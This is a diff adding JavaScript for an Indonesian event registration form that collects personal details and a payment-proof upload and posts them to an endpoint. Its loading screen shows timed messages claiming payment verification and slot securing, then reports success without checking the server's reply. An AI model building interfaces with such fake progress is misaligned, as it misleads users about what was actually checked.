+function updSum(){updPrice();var j=$('input[name="ukuran_jersey"]:checked');if(j)$('#sJrs').textContent=j.value}
+
+function chgQty(a){if(a==='inc'&&qty<MQ)qty++;else if(a==='dec'&&qty>MNQ)qty--;$('#tQty').value=qty;updPrice()}
+
+function openM(){$('#szModal').classList.add('show')}
+function closeM(){$('#szModal').classList.remove('show')}
+
+var tTmr;
+function showT(m,t){t=t||'info';var ts=$('#toast'),ms=$('#toastMsg'),ic=ts.querySelector('i');
+ms.textContent=m;ts.style.background={error:'#EF4444',success:'#10B981',info:'#1A1A1A'}[t]||'#1A1A1A';
+ic.className='fa-solid '+({error:'fa-circle-exclamation',success:'fa-circle-check',info:'fa-circle-info'}[t]||'fa-circle-info');
+ts.classList.add('show');if(tTmr)clearTimeout(tTmr);tTmr=setTimeout(function(){ts.classList.remove('show')},3500)}
+
+function updSub(){
+var fi=$('#buktiIn'),cb=$('#agreeCb'),btn=$('#subBtn'),ht=$('#btnHt');
+if(!fi||!cb||!btn)return;
+var ok=fi.files.length>0&&cb.checked;btn.disabled=!ok;if(ht)ht.style.display=ok?'none':'block'
+}
+
+function showPL(){
+var ov=$('#pLoad');ov.classList.add('show');
+var st=performance.now();
+var pf=$('#plFl'),pe=$('#plPc'),te=$('#plTm'),se=$('#plSt');
+var msgs=['Memverifikasi pembayaran...','Validasi data...','Mengamankan slot...','Mengirim konfirmasi...'];
+var mi=0;
+var iv=setInterval(function(){mi=Math.min(mi+1,msgs.length-1);se.textContent=msgs[mi]},PD/msgs.length);
+function up(n){var el=n-st,pr=Math.min(el/PD,1),pc=Math.floor(pr*100);
+pf.style.width=pc+'%';pe.textContent=pc+'%';
+var rm=Math.max(0,PD-el);te.textContent=Math.floor(rm/60000)+':'+String(Math.floor((rm%60000)/1000)).padStart(2,'0');
+if(pr<1)requestAnimationFrame(up);else{clearInterval(iv);se.textContent='Pendaftaran berhasil!';setTimeout(function(){window.location.href='success.html'},1500)}
+}requestAnimationFrame(up)
+}
+
+async function submitF(){
+if(!valStep(3))return;
+var fi=$('#buktiIn'),cb=$('#agreeCb');
+if(fi.files.length===0)return showT('Silakan unggah bukti pembayaran','error');
+if(!cb.checked)return showT('Silakan centang kotak persetujuan','error');
+var btn=$('#subBtn');btn.disabled=true;btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> MEMPROSES...';
+try{
+var form=$('#regForm'),fd=new FormData(form);
+var bp=parseInt(form.kategori.value,10)||0;
+var cl=form.kategori.options[form.kategori.selectedIndex].text;
+var jv=$('input[name="ukuran_jersey"]:checked');jv=jv?jv.value:'-';
+var ri='PLN-2026-'+Math.floor(1000+Math.random()*9000);
+fd.set('reg_id',ri);fd.set('jumlah_tiket',qty);
+fd.set('total_harga','Rp '+(bp*qty).toLocaleString('id-ID'));
+fd.set('ukuran_jersey',jv);fd.set('wa','+62 '+form.wa.value);
+fd.set('hp_darurat','+62 '+form.hp_darurat.value);fd.set('kategori_label',cl);
+await fetch(EP,{method:'POST',body:fd,headers:{'Accept':'application/json'}});
+showPL()
+}catch(err){console.error('Submit error:',err);showT('Terjadi kesalahan. Coba lagi.','error');
+btn.disabled=false;btn.innerHTML='<i class="fa-solid fa-cloud-arrow-up"></i> KONFIRMASI PENDAFTARAN'}
+}
+
+document.body.addEventListener('click',function(e){
+var t=e.target.closest('[data-action]');if(!t)return;
+switch(t.dataset.action){
+case'next':nextS(parseInt(t.dataset.from,10));break;
+case'prev':prevS(parseInt(t.dataset.from,10));break;
+case'submit':submitF();break;
+case'open-modal':openM();break;
+case'close-modal':closeM();break;
+case'qty-inc':chgQty('inc');break;
+case'qty-dec':chgQty('dec');break;
+case'close-modal-bg':if(e.target===t)closeM();break
+}
+});
+
+document.body.addEventListener('change',function(e){
+if(e.target.matches('input[name="ukuran_jersey"]')){
+ $$('input[name="ukuran_jersey"]').forEach(function(i){i.closest('label.rc').classList.remove('sel')});
+e.target.closest('label.rc').classList.add('sel')
+}
+if(e.target.matches('#catSel'))updPrice();
+if(e.target.matches('#buktiIn')||e.target.matches('#agreeCb'))updSub()
+});
+
+ $('#regForm').addEventListener('keydown',function(e){
+if(e.key==='Enter'&&e.target.tagName!=='TEXTAREA'){e.preventDefault();$('.sp.active [data-action="next"]')&&$('.sp.active [data-action="next"]').click()}
+});
+
+animTC();updPrice();updSub();
+})();
+</script>
+</body>
+</html>
